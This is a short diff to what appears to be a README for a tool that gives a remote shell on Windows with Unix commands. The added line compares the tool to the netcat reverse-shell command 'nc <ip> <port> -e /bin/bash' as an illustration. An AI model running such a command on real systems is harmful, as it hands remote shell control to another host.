@@ -12,7 +12,7 @@ Remote shell on windows with Unix command
 ## 🔦 Idea
 **Aim?**
 
-Providing equivalent of bash (Unix cmd) on Windows
+Providing equivalent of bash (Unix cmd) on Windows, like if we would launch `nc <ip> <port> -e /bin/bash`
 
 > Powershell & cmd already exist!
 
